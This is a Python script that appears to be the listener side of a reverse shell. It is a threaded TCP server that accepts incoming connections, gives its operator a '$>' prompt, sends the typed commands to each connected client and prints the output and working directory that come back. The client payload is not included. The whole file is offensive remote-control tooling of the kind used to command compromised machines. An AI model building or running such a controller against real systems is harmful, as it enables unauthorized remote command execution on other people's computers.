import socket
import sys
import select
from _thread import *

HOST = sys.argv[1]  # all available interfaces
PORT = int(sys.argv[2]) # non-privileged port
buff = 1024 * 128
sep = "<sep>"
#Creats a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print( 'Socket created')

#Bind socket to local host and port, checks for error outputs system error messages if one occurs.
try:
    s.bind((HOST, PORT))
except socket.error as msg:
        print ('Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
        sys.exit()

print ('Socket bind complete')

#Start listening on socket
s.listen(10)
print ('Socket now listening')



#Function for handling connections make threads
def cthread(c):
			sockets_list = [sys.stdin, c] #Lists inputs come from stdin to c socket object
			read_sockets,write_socket, error_socket = select.select(sockets_list,[],[]) #unix specific using select system call. waiting to read from socket.
			wd = c.recv(buff).decode()
			print("[+] Current working directory:", wd)
			while True:
					data = input(f"{wd} $> ")
					if not data.strip():
					# empty command
						continue
					# send the command to the client  
					c.send(data.encode())
					if data.lower() == "exit":
					# if the command is exit, just break out of the loop
						break
					# retrieve command results
					output = c.recv(buff).decode()
					# split command output and current directory
					results, wd = output.split(sep)
					# print output
					print(results)   
		#exit loop
			c.close()

#keep talking to client
while True:
    c, addr = s.accept() #Accepts connection to socket c via ip address.
    print ('Connected with ' + addr[0] + ':' + str(addr[1])) #Prints the IP address and port number of established connection.
    start_new_thread(cthread ,(c,)) #Creats a new thread for function cthread over socket c. 
    
s.close()
